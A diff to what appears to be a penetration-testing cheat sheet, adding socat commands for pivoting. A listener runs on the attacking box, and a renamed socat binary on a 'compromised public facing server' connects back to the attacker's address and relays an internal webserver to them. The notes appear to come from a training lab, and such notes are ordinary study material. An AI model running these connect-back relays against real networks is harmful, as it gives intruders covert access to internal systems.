@@ -75,3 +75,14 @@ Connect to listener, using '-' as STDIN and cert verification off.
 
 `socat - OPENSSL:<LISTENER IP>:443,verify=0`  
 
+## Connect to a webserver through a port forward.  
+
+On the attacking box.  
+
+`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`  
+
+On the compromised public facing server. This will connect back to me (10.50.106.14:8001) and to the internal webserver (10.200.105.150:80).  
+
+`./G3N-socat tcp:10.50.106.14:8001 tcp:10.200.105.150:80,fork &`  
+
+To access this on browser use localhost:8000 or 'curl 127.0.0.1:8000'.
